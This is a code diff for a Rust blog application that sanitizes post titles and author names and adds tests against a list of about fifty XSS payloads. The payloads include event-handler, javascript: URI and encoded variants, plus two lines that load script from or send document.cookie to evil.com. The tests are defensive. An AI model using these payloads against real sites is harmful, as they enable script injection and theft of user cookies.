@@ -258,8 +258,8 @@ fn create_post(
 
     let post = Post {
         id: post_id.clone(),
-        title: form.title.clone(),
-        author: form.alias.clone().unwrap_or_default(),
+        title: parser::sanitize_text(&form.title),
+        author: parser::sanitize_text(&form.alias.as_deref().unwrap_or("")),
         content: rendered_content,
         raw_content: form.content.clone(),
         created_at: Utc::now(),
@@ -675,6 +675,145 @@ mod tests {
         let sanitized = ammonia::clean(malicious_content);
         assert!(!sanitized.contains("<script>"));
         assert!(!sanitized.contains("alert"));
+    }
+
+    #[test]
+    fn test_title_and_author_sanitization() {
+        let malicious_title = "<script>alert('xss')</script>Safe Title";
+        let sanitized_title = parser::sanitize_text(&malicious_title);
+        assert_eq!(sanitized_title, "Safe Title");
+
+        let malicious_author = "<b>Bold</b><script>alert('xss')</script>John Doe";
+        let sanitized_author = parser::sanitize_text(&malicious_author);
+        assert_eq!(sanitized_author, "BoldJohn Doe");
+
+        let clean_text = "Normal Title";
+        let sanitized_clean = parser::sanitize_text(&clean_text);
+        assert_eq!(sanitized_clean, "Normal Title");
+
+        let various_tags = "<h1>Title</h1><p>Content</p><script>alert('xss')</script>";
+        let sanitized_various = parser::sanitize_text(&various_tags);
+        assert_eq!(sanitized_various, "TitleContent");
+    }
+
+    #[test]
+    fn test_xss_attack_vectors() {
+        let xss_test_cases = [
+            "<script>alert('XSS')</script>",
+            "<script>alert(1)</script>",
+            "<script src='http://evil.com/xss.js'></script>",
+            "<script>console.log('test')</script>",
+            "<SCRIPT>alert('XSS')</SCRIPT>",
+            "<script>alert(document.cookie)</script>",
+            "<script>alert(String.fromCharCode(88,83,83))</script>",
+            "<script>fetch('//evil.com?c='+document.cookie)</script>",
+            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
+            "<script>alert`1`</script>",
+            "<img src=x onerror=alert('XSS')>",
+            "<img src=x onerror=alert(1)>",
+            "<img src='x' onerror='alert(1)'>",
+            "<img src=\"x\" onerror=\"alert('XSS')\">",
+            "<img/src='x'/onerror='alert(1)'>",
+            "<img src=x:alert(1) onerror=eval(src)>",
+            "<img src='x' onerror='javascript:alert(1)'>",
+            "<IMG SRC=javascript:alert('XSS')>",
+            "<img src=`x` onerror=alert(1)>",
+            "<img src=x a='' onerror=alert(1)>",
+            "<body onload=alert('XSS')>",
+            "<input onfocus=alert(1) autofocus>",
+            "<select onfocus=alert(1) autofocus>",
+            "<textarea onfocus=alert(1) autofocus>",
+            "<iframe onload=alert('XSS')>",
+            "<svg onload=alert(1)>",
+            "<marquee onstart=alert(1)>",
+            "<details open ontoggle=alert(1)>",
+            "<div onmouseover=alert(1)>test</div>",
+            "<button onclick=alert(1)>Click</button>",
+            "<svg><script>alert(1)</script></svg>",
+            "<svg><animate onbegin=alert(1)>",
+            "<svg><a xlink:href='javascript:alert(1)'><text>XSS</text></a></svg>",
+            "<math><mtext></mtext><script>alert(1)</script></math>",
+            "<form><button formaction=javascript:alert(1)>Click",
+            "<object data='javascript:alert(1)'>",
+            "<embed src='javascript:alert(1)'>",
+            "<iframe src='javascript:alert(1)'>",
+            "<link rel='stylesheet' href='javascript:alert(1)'>",
+            "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
+            "<script>eval(atob('YWxlcnQoMSk='))</script>",
+            "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
+            "<script>\u{0061}lert(1)</script>",
+            "<script>ale\u{0072}t(1)</script>",
+            "javascript:alert(1)",
+            "javascript&#58;alert(1)",
+            "javascript&#x3A;alert(1)",
+            "<a href='javascript:alert(1)'>Click</a>",
+            "<a href='jav&#x09;ascript:alert(1)'>Click</a>",
+            "<img src='x' onerror='&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;'>",
+        ];
+
+        for (i, xss_payload) in xss_test_cases.iter().enumerate() {
+            let sanitized = parser::sanitize_text(xss_payload);
+            assert!(
+                !sanitized.contains("<"),
+                "Test case {}: {} contains HTML tags",
+                i + 1,
+                xss_payload
+            );
+            assert!(
+                !sanitized.contains(">"),
+                "Test case {}: {} contains HTML tags",
+                i + 1,
+                xss_payload
+            );
+        }
+
+        let mixed_payload = "Hello <script>alert('XSS')</script> World";
+        let sanitized_mixed = parser::sanitize_text(&mixed_payload);
+        assert_eq!(sanitized_mixed, "Hello  World");
+
+        let title_with_xss = "My Blog Post <img src=x onerror=alert(1)>";
+        let sanitized_title = parser::sanitize_text(&title_with_xss);
+        assert_eq!(sanitized_title, "My Blog Post ");
+
+        let dangerous_payloads = [
+            ("<script>alert('XSS')</script>", ""),
+            ("<img src=x onerror=alert(1)>", ""),
+            ("Safe Title <script>evil()</script>", "Safe Title "),
+            ("<svg onload=alert(1)>", ""),
+            ("Author <iframe src='javascript:alert(1)'>", "Author "),
+            (
+                "This is a very long title that should be truncated",
+                "This is a very ",
+            ),
+        ];
+
+        for (payload, expected) in dangerous_payloads {
+            let result = parser::sanitize_text(payload);
+            assert_eq!(result, expected, "Failed for payload: {}", payload);
+        }
+    }
+
+    #[test]
+    fn test_post_creation_sanitization_integration() {
+        let storage = Arc::new(Mutex::new(PostCache::new(128)));
+        let malicious_title = "<script>alert('xss')</script>Clean Title";
+        let malicious_author = "<b>Bold</b><img src=x>Author";
+        let clean_content = "This is safe content";
+
+        let post_id = generate_post_id("clean-fallback", &storage).unwrap();
+        let rendered_content = parser::render_markdown(clean_content);
+
+        let post = Post {
+            id: post_id.clone(),
+            title: parser::sanitize_text(&malicious_title),
+            author: parser::sanitize_text(&malicious_author),
+            content: rendered_content,
+            raw_content: clean_content.to_string(),
+            created_at: Utc::now(),
+        };
+
+        assert_eq!(post.title, "Clean Title");
+        assert_eq!(post.author, "BoldAuthor");
     }
 
     #[test]
